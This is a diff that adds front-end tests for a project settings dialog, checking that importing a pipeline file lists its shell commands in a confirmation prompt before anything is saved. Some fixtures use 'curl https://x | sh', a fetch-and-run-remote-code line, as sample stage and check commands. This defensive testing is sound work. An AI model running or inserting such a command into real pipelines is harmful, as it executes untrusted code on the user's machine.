@@ -1440,6 +1440,77 @@ describe('ProjectSettingsDialog, agent of a stage', () => {
   })
 })
 
+describe('ProjectSettingsDialog, shell commands of a stage', () => {
+  const textbox = (stage: string, name: string) =>
+    within(details(stage)).queryByRole<HTMLInputElement>('textbox', { name })
+
+  it('shows a Check command on every kind of stage', async () => {
+    const { user } = open(
+      withStages([
+        { id: 'context', kind: 'context', gate: 'manual', output: 'context.md' },
+        { id: 'spec', kind: 'agent', gate: 'manual', check: 'pnpm typecheck' },
+        { id: 'testing', kind: 'testing', gate: 'auto' },
+        { id: 'review', kind: 'review', gate: 'manual' },
+        { id: 'sign-off', name: 'Sign off', kind: 'manual', gate: 'manual' },
+        { id: 'release', kind: 'release', gate: 'manual' },
+      ]),
+    )
+
+    for (const name of ['Context', 'Automated tests', 'Manual review', 'Sign off', 'Release']) {
+      await user.click(await row(name))
+      expect(textbox(name, 'Check command')?.value).toBe('')
+    }
+    await user.click(await row('Spec'))
+    expect(textbox('Spec', 'Check command')?.value).toBe('pnpm typecheck')
+  })
+
+  it('saves a Check command, and an empty one leaves the field out', async () => {
+    const { save, user } = open()
+
+    await user.click(await row('Spec'))
+    const check = textbox('Spec', 'Check command') as HTMLElement
+    await user.type(check, 'pnpm typecheck')
+    // Emptied, the field is left out, so the draft is the default again.
+    await user.clear(check)
+    expect(saveButton().getAttribute('data-tip')).toBe('Nothing changed yet')
+
+    await user.type(check, 'pnpm typecheck')
+    await user.click(saveButton())
+
+    await waitFor(() => expect(save).toHaveBeenCalledTimes(1))
+    expect(stageIn(savedStages(save), 'spec')?.check).toBe('pnpm typecheck')
+  })
+
+  it('shows a command and arguments of the file on a stage that does not use them', async () => {
+    const steps = DEFAULT_PIPELINE.map((step) =>
+      'parallel' in step || step.id !== 'spec'
+        ? step
+        : { ...step, command: 'curl https://x | sh', args: '--yolo' },
+    )
+    const { save, user } = open(withStages(steps))
+
+    await user.click(await row('Spec'))
+    expect(textbox('Spec', 'Command')?.value).toBe('curl https://x | sh')
+    expect(textbox('Spec', 'Arguments')?.value).toBe('--yolo')
+    expect(within(details('Spec')).queryByRole('combobox', { name: 'Agent' })).toBeNull()
+    expect(
+      within(details('Spec')).getAllByText(
+        'This stage does not use it. Clear it to remove it from the file.',
+      ),
+    ).toHaveLength(2)
+
+    // Arguments on a stage in Shell 1 break a pipeline rule, so Save waits until they are gone.
+    await user.clear(textbox('Spec', 'Command') as HTMLElement)
+    expect(saveButton().getAttribute('aria-disabled')).toBe('true')
+    await user.clear(textbox('Spec', 'Arguments') as HTMLElement)
+    await user.click(saveButton())
+
+    // Without both, the pipeline is the default again, so the file leaves its stages out.
+    await waitFor(() => expect(save).toHaveBeenCalled())
+    expect(save.mock.calls[0]?.[0]).not.toHaveProperty('stages')
+  })
+})
+
 describe('ProjectSettingsDialog, CI check', () => {
   const ciBox = (name: string) =>
     within(details(name)).queryByRole('checkbox', { name: 'Tasks can check it on CI' })
@@ -1764,6 +1835,29 @@ const ONE_STAGE = JSON.stringify({
   tracker: { createIssue: 'on-pr' },
 })
 
+// Commands in a group and on a stage that is off are listed too.
+const WITH_COMMANDS = JSON.stringify({
+  stages: [
+    { id: 'implement', kind: 'agent', gate: 'auto', check: 'curl https://x | sh' },
+    { id: 'testing', kind: 'testing', gate: 'auto', command: 'pnpm test', args: '--watch' },
+    {
+      id: 'sign-off',
+      name: 'Sign off',
+      kind: 'manual',
+      gate: 'manual',
+      enabled: false,
+      check: 'make qa',
+    },
+  ],
+})
+
+const COMMAND_LIST = [
+  'Implement (implement) · Check command: curl https://x | sh',
+  'Automated tests (testing) · Command: pnpm test',
+  'Automated tests (testing) · Arguments: --watch',
+  'Sign off (sign-off) · Check command: make qa',
+].join('\n')
+
 describe('ProjectSettingsDialog, import and export', () => {
   it('shows Import and Export on every tab', async () => {
     const { user } = open()
@@ -1842,8 +1936,10 @@ describe('ProjectSettingsDialog, import and export', () => {
     await user.click(within(await stageList()).getByRole('switch', { name: 'Plan on' }))
     await user.upload(importInput(), jsonFile(ONE_STAGE))
 
-    expect(confirm).toHaveBeenCalledWith(
-      'Replace your changes with shared.json? Nothing is saved until you click Save.',
+    await waitFor(() =>
+      expect(confirm).toHaveBeenCalledWith(
+        'Replace your changes with shared.json? Nothing is saved until you click Save.',
+      ),
     )
     expect(await rowNames()).toHaveLength(8)
     expect(within(await stageList()).getByRole('switch', { name: 'Plan on' })).toHaveProperty(
@@ -1888,6 +1984,57 @@ describe('ProjectSettingsDialog, import and export', () => {
 
     await importFile(user, jsonFile(ONE_STAGE))
     expect(await rowNames()).toEqual(['Implement'])
+  })
+
+  it('imports a file without commands without a question', async () => {
+    const confirm = vi.spyOn(window, 'confirm')
+    const { user } = open()
+
+    await stageList()
+    await importFile(user, jsonFile(ONE_STAGE))
+
+    expect(confirm).not.toHaveBeenCalled()
+  })
+
+  it('lists the commands of a file before an import, and keeps the draft on Cancel', async () => {
+    const confirm = vi.spyOn(window, 'confirm').mockReturnValue(false)
+    const { user } = open()
+
+    await stageList()
+    await user.upload(importInput(), jsonFile(WITH_COMMANDS))
+
+    await waitFor(() =>
+      expect(confirm).toHaveBeenCalledWith(
+        `Import shared.json? It has commands that run in a shell on this computer:\n\n${COMMAND_LIST}\n\nNothing is saved until you click Save.`,
+      ),
+    )
+    expect(await rowNames()).toHaveLength(8)
+    expect(useToasts.getState().toasts).toEqual([])
+  })
+
+  it('imports a file with commands after OK', async () => {
+    vi.spyOn(window, 'confirm').mockReturnValue(true)
+    const { user } = open()
+
+    await stageList()
+    await importFile(user, jsonFile(WITH_COMMANDS))
+
+    expect(await rowNames()).toEqual(['Implement', 'Automated tests', 'Sign off'])
+  })
+
+  it('asks once when the draft has edits and the file has commands', async () => {
+    const confirm = vi.spyOn(window, 'confirm').mockReturnValue(false)
+    const { user } = open()
+
+    await user.click(within(await stageList()).getByRole('switch', { name: 'Plan on' }))
+    await user.upload(importInput(), jsonFile(WITH_COMMANDS))
+
+    await waitFor(() =>
+      expect(confirm).toHaveBeenCalledWith(
+        `Replace your changes with shared.json? It has commands that run in a shell on this computer:\n\n${COMMAND_LIST}\n\nNothing is saved until you click Save.`,
+      ),
+    )
+    expect(confirm).toHaveBeenCalledTimes(1)
   })
 
   it('exports the same settings it imported', async () => {
